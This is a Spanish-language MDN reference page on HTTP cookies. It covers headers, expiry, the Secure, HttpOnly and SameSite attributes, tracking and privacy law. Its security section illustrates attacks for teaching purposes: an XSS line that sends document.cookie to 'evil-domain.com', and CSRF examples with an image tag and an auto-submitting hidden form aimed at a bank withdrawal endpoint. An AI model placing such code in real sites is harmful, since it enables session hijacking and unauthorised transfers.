---
title: HTTP cookies
slug: Web/HTTP/Guides/Cookies
original_slug: Web/HTTP/Cookies
---

Una cookie HTTP, cookie web o cookie de navegador es una pequeña pieza de datos que un servidor envía a el navegador web del usuario. El navegador guarda estos datos y los envía de regreso junto con la nueva petición al mismo servidor. Las cookies se usan generalmente para decirle al servidor que dos peticiones tienen su origen en el mismo navegador web lo que permite, por ejemplo, mantener la sesión de un usuario abierta. Las cookies permiten recordar la información de estado en vista a que el protocolo HTTP es un protocolo sin estado.

Las cookies se utilizan principalmente con tres propósitos:

- Gestión de Sesiones
  - : Inicios de sesión, carritos de compras, puntajes de juegos o cualquier otra cosa que el servidor deba recordar
- Personalización
  - : Preferencias de usuario, temas y otras configuraciones
- Rastreo
  - : Guardar y analizar el comportamiento del usuario

Las cookies se usaron una vez para el almacenamiento general del lado del cliente. Si bien esto era legítimo cuando eran la única forma de almacenar datos en el cliente, hoy en día se recomienda preferir las API de almacenamiento modernas. Las cookies se envían con cada solicitud, por lo que pueden empeorar el rendimiento (especialmente para las conexiones de datos móviles). Las APIs modernas para el almacenamiento del cliente son la [Web storage API](/es/docs/Web/API/Web_Storage_API) (`localStorage` y `sessionStorage`) e [IndexedDB](/es/docs/Web/API/IndexedDB_API).

> [!NOTE]
> Para ver las cookies almacenadas (y otro tipo de almacenamiento que una página web puede usar), puede habilitar el [Inspector de Almacenamiento](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html) en Herramientas del desarrollador y seleccionar Cookies en el árbol de almacenamiento.

## Creando cookies

Al recibir una solicitud HTTP, un servidor puede enviar un encabezado {{HTTPHeader ("Set-Cookie")}} con la respuesta. La cookie generalmente es almacenada por el navegador, y luego la cookie se envía con solicitudes hechas al mismo servidor dentro de un encabezado HTTP {{HTTPHeader ("Cookie")}}. Se puede especificar una fecha de vencimiento o duración, después de lo cual ya no se envía la cookie. Además, se pueden establecer restricciones a un dominio y ruta específicos, lo que limita el lugar donde se envía la cookie.

### Los encabezados `Set-Cookie` y `Cookie`

El encabezado de respuesta HTTP {{HTTPHeader ("Set-Cookie")}} envía las cookies del servidor al agente de usuario. Una cookie simple se establece así:

```
Set-Cookie: <nombre-cookie>=<valor-cookie>
```

Este encabezado del servidor le dice al cliente que almacene una cookie.

> [!NOTE]
> Aquí se explica como usar el encabezado `Set-Cookie` en varias aplicaciones del lado del servidor:
>
> - [PHP](https://secure.php.net/manual/en/function.setcookie.php)
> - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
> - [Python](https://docs.python.org/3/library/http.cookies.html)
> - [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Ahora, con cada nueva solicitud al servidor, el navegador enviará todas las cookies almacenadas previamente al servidor utilizando el encabezado {{HTTPHeader ("Cookie")}}.

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

### Cookies de sesión

La cookie creada anteriormente es una cookie de sesión: se elimina cuando el cliente se cierra, por que no se especificó una directiva `Expires` o `Max-Age` . Sin embargo, los navegadores web pueden usar la **restauración de sesiones**, lo que hace que la mayoría de las cookies de sesión sean permanentes, como si el navegador nunca se cerrara.

### Cookies Permanentes

En lugar de expirar cuando el cliente se cierra, las _cookies permanentes_ expiran en una fecha específica (`Expires`) o tras un periodo de tiempo específico (`Max-Age`).

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

> [!NOTE]
> Cuando se establece una fecha de expiración, la fecha y hora que se establece es relativa al cliente en el que se establece la cookie, no del servidor.

### Cookies `Secure` y `HttpOnly`

Una cookie segura sólo se envía al servidor con una petición cifrada sobre el protocolo HTTPS. Incluso con `Secure`, no debería almacenarse _nunca_ información sensible en la cookies, ya que son inherentemente inseguras y este flag no puede ofrecer protección real. A partir de Chrome 52 y Firefox 52, los sitios inseguros (`http:`) no pueden establecer cookies con la directiva `Secure`.

Para prevenir ataques cross-site scripting ([XSS](/es/docs/Web/Security/Attacks#cross-site_scripting_xss)), las cookies `HttpOnly` son inaccesibles desde la API de Javascript {{domxref("Document.cookie")}}; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### Alcance de las cookies

Las directivas `Domain` y `Path` definen el alcance de la cookie: a qué URLs deberían enviarse las cookies.

`Domain` especifica los hosts permitidos para recibir la cookie. Si no se especifica, toma como valor por defecto el [host del Document.location actual,](/es/docs/Web/API/Document/location) **excluyendo subdominios**. Si se especifica `Domain`, los subdominios son siempre incluidos.

Por ejemplo, si se establece `Domain=mozilla.org`, las cookies se incluyen en subdominios como `developer.mozilla.org`.

`Path` indica una ruta URL que debe existir en la URL solicitada para enviar el header. El carácter %x2F ("/") es considerado un separador de directorios, y los subdirectorios también coincidirán.

Por ejemplo, si se establece `Path=/docs` estas rutas coincidirán:

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

### Cookies `SameSite` {{experimental_inline}}

Las cookies `SameSite` permiten a los servidores requerir que una cookie no sea enviada con solicitudes cross-site (donde {{Glossary("Site")}} es definido por el dominio registrabe), lo que proporciona algo de protección contra ataques cross-site request forgery ({{Glossary("CSRF")}}).

Las cookies `SameSite` son relativamente nuevas y [soportadas por los principales navegadores](/es/docs/Web/HTTP/Reference/Headers/Set-Cookie#browser_compatibility).

Aquí hay un ejemplo:

```
Set-Cookie: key=value; SameSite=Strict
```

El atributo same-site puede tomar uno de los dos valores (case-insensitive):

- `Strict`
  - : Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie. Si la solicitud se originó desde una URL diferente que la URL del location actual, no se incluirá ninguna cookie etiquetada con el atributo `Strict`.
- `Lax`
  - : Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames, pero se enviarán cuando un usuario navegue a la URL desde un sitio externo, por ejemplo, siguiendo un enlace.

El comportamiento por defecto de este flag si no está establecido, o no está soportado por el navegador, es incluir las cookies en cualquier solicitud, incluyendo solicitudes corss-origin.

### Acceso desde JavaScript usando `Document.cookie`

También se pueden crear nuevas cookies via JavaScript usando la propiedad {{domxref("Document.cookie")}}, y si el flag `HttpOnly` no está establecido, también se puede acceder a las cookies existentes desde JavaScript.

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

Tenga en cuenta las cuestiones de seguridad en la siguiente sección [Seguridad](#security). Las cookies disponibles para JavaScript pueden ser robadas por medio de XSS.

## Seguridad

> [!NOTE]
> Nunca se debe almacenar ni transmitir información confidecial o sensible mediante Cookies HTTP, ya que todo el mecanismo es inherentemente inseguro.

### Secuestro de session y XSS

Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad [XSS](/es/docs/Web/Security/Attacks#cross-site_scripting_xss) de la aplicación.

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

El atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.

### Cross-site request forgery (CSRF)

[Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona buenos ejemplos para {{Glossary("CSRF")}}. En este caso, alguien puede incluir una imagen que no es realmente una imagen (por ejemplo un chat o foro sin filtrar), que en lugar de esto es realmente una solicitud de tu banco para retirar tu dinero:

```html
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```

Ahora, si tu tienes una sesión iniciada en tu tu cuenta bancaria y las cookies permanecen siendo válidas (y no hay otra validación mas que esa), se realizará la transferencia desde tu cuenta tan pronto como se cargue el html que contiene la imagen. Para los endpoints que requieren una petición de tipo POST, se puede disparar un evento de tipo envío de formulario (posiblemente en un iframe invisible) cuando la página se carga:

```html
<form action="https://bank.example.com/withdraw" method="POST">
  <input type="hidden" name="account" value="bob" />
  <input type="hidden" name="amount" value="1000000" />
  <input type="hidden" name="for" value="mallory" />
</form>
<script>
  window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }
</script>
```

Se presentan aquí algunas técnicas que se deberían usar para evitar que estas cosas ocurran:

- Los endpoints GET no deben tener acciones de modificación, y si esto se necesita se debería requerir una petición POST. Además los endpoints POST no debería aceptar la intercambiabilidad de aceptar peticiones GET con parametros en _query string_
- Un token CSRF debería ser incluido en cada elemento `<form>` mediante un input oculto. Este token debe ser único para cada usuario y almacenado (por ejemplo, en una _cookie_). De esta forma el servidor puede mirar si el valor requerido es enviado, y en cierto modo lo idea sería descartar la petición si el valor no concuerda con lo esperado.
  - Este método de protección recae en la imposibilidad de que un atacante pueda predecir este token autogenerado en cada inicio de sesión. Cabe aclarar que este token debería ser regenerado en cada inicio de sesión.

- Al igual que con [XSS](/es/docs/Web/Security/Attacks#cross-site_scripting_xss), el filtrado de entrada es importante.
- Debería de existir siempre un requerimiento de confirmación para cualquier acción delicada,.
- Las cookies empleadas en acciones delicadas deberían de tener una vida útil breve.
- Para más prevención visita [OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>).

## Rastreo y privacidad

### Cookies de terceros

Las Cookies tienen un dominio asociado a ellas. Si este dominio es el mismo que el dominio de la página en la que el cliente se encuentra, se llama _cookie de origen_. Si el dominio es distinto, se denomina _cookie de terceros_. Si bien las cookies de origen se envían únicamente al servidor que las configura, una página web puede contener imágenes u otros componentes almacenados en servidores de otros dominios (como publicidad). Las cookies que se envían a través de estos componentes de terceros se utilizan principalmente para publicidad y seguimiento en la web. Por ejemplo, [los tipos de cookies utilizadas por Google](https://www.google.com/policies/technologies/types/).

Un servidor de terceros puede crear un perfil del historial y los hábitos de navegación de un usuario basándose en las cookies que le envía el mismo navegador al acceder a varios sitios. Firefox, de forma predeterminada, bloquea las cookies de terceros que se sabe que contienen rastreadores. Las cookies de terceros (o simplemente las cookies de seguimiento) también pueden bloquearse mediante otras configuraciones o extensiones del navegador. El bloqueo de cookies puede provocar que algunos componentes de terceros (como los widgets de redes sociales) no funcionen según lo previsto.

Hay algunas funciones útiles disponibles para los desarrolladores que desean respetar la privacidad del usuario y minimizar el seguimiento de terceros:

- Los servidores pueden (y deberían) configurar el atributo SameSite para especificar si se pueden enviar o no cookies de terceros.
- Las cookies que tienen un estado de partición independiente (CHIPS) les permiten a los desarrolladores habilitar sus cookies en el almacenamiento particionado, con un contenedor de cookies separado por sitio de nivel superior. Esto permite que los usos válidos sin seguimiento de cookies de terceros sigan funcionando en navegadores que no permiten el uso de cookies para el seguimiento de terceros.

## Regulaciones relacionadas a las cookies

La legislación o normativa que cubre el uso de cookies incluye:

- El Reglamento General de Privacidad de Datos (RGPD) en la Unión Europea
- La Directiva sobre la privacidad electrónica en la Unión Europea
- Ley de Privacidad del Consumidor de California (CCPA)

Estas regulaciones tienen alcance global. Se aplican a cualquier sitio del internet al que accedan usuarios de estas jurisdicciones (la UE y California, con la salvedad de que la ley de California se aplica sólo a entidades con ingresos brutos superiores a 25 millones de dólares, entre otras cosas).

Estas regulaciones incluyen requisitos tales como:

- Notificar a los usuarios que el sitio utiliza cookies.
- Permitir a los usuarios escoger no recibir algunas o todas las cookies.
- Permitir a los usuarios utilizar la mayor parte del servicio sin recibir cookies.

Puede haber otras regulaciones que rijan el uso de cookies en tu ubicación. La carga de conocer y cumplir estas regulaciones recae sobre usted. Hay empresas que ofrecen un código de "banner de cookies" que le ayuda a cumplir con estas normativas.

## Otras formas de almacenar información en el navegador

Otro enfoque para almacenar datos en el navegador es la [API de almacenamiento web](/es/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Las propiedades [window.sessionStorage](/es/docs/Web/API/Window/sessionStorage) y [window.localStorage](/es/docs/Web/API/Window/localStorage) corresponden a cookies de sesión y permanentes en duración, pero tienen límites de almacenamiento mayores que las cookies y nunca se envían a un servidor. Se pueden almacenar cantidades de datos más estructuradas y mayores utilizando la [API IndexedDB](/es/docs/Web/API/IndexedDB_API) o una biblioteca construida sobre ella.

Existen algunas técnicas diseñadas para recrear las cookies después de eliminarlas. Se conocen como cookies "zombies". Estas técnicas violan los principios de privacidad y control del usuario, pueden violar las regulaciones de privacidad de datos y podrían exponer a un sitio web que las utilice a responsabilidad legal.

## Véase También

- {{HTTPHeader("Set-Cookie")}}
- {{HTTPHeader("Cookie")}}
- {{domxref("Document.cookie")}}
- {{domxref("Navigator.cookieEnabled")}}
- [Inspeccionar cookies usando el Storage Inspector](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html)
- [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
- [Nicholas Zakas article on cookies](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/)
- [Nicholas Zakas article on cookies and security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/)
- [HTTP cookies en Wikipedia](<https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)>)
